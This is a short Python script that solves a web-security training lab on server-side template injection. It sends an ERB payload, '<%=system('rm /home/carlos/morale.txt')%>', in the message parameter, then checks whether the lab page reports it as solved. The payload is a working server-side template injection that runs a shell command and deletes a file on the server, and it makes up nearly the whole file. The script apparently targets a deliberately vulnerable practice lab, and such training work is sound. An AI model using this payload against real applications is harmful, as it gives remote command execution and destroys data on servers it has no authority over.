import requests
import argparse

parser = argparse.ArgumentParser(description='Solves the following Lab: Basic server-side template injection')
parser.add_argument('--id', action='store', help='lab ID, ex: 0a6e00ec03ca2e848083672100ee00fb', required=True)
lab = parser.parse_args()

r = requests.get("https://" + lab.id + ".web-security-academy.net/?message=<%=system('rm /home/carlos/morale.txt')%>")

try:
    assert('<p>Solved</p>' in requests.get("https://" + lab.id + ".web-security-academy.net/").text)
    print('Lab solved.')
except Exception:
    print("Error while trying to solve the lab.")